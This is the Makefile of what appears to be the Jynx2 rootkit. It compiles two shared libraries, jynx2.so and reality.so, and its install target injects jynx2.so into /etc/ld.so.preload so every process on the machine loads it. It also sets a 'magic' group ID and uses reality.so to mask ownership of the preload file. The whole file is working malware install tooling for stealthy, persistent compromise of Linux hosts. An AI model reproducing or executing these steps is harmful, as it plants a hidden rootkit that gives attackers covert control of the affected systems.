INSTALL=/XxJynx
MAGIC_GID=7
MAGIC_UID=7
ARCH := $(shell uname -m | sed 's/i686/32/; s/x86_64/64/')

all: jynx2.so reality.so

jynx2.so: jynx2.c
	gcc -m$(ARCH) jynx2.c -Wall -shared -fPIC -ldl -lssl -o jynx2.so 

reality.so: reality.c
	gcc -m$(ARCH) reality.c -Wall -shared -fPIC -ldl -o reality.so

install: all
	@echo [-] Initiating Installation Directory $(INSTALL)
	@test -d $(INSTALL) || mkdir $(INSTALL)
	@echo [-] Installing jynx2.so and reality.so
	@install -m 0755 jynx2.so $(INSTALL)/
	@install -m 0755 reality.so $(INSTALL)/	
	@echo [-] Morphing Magic GID \($(MAGIC_GID)\)
	@chown $(MAGIC_UID):$(MAGIC_GID) $(INSTALL)* 
	@echo [-] Injecting jynx2.so
	@echo $(INSTALL)/jynx2.so > /etc/ld.so.preload
	@LD_PRELOAD=./reality.so chgrp $(MAGIC_GID) /etc/ld.so.preload
clean:
	rm jynx2.so reality.so

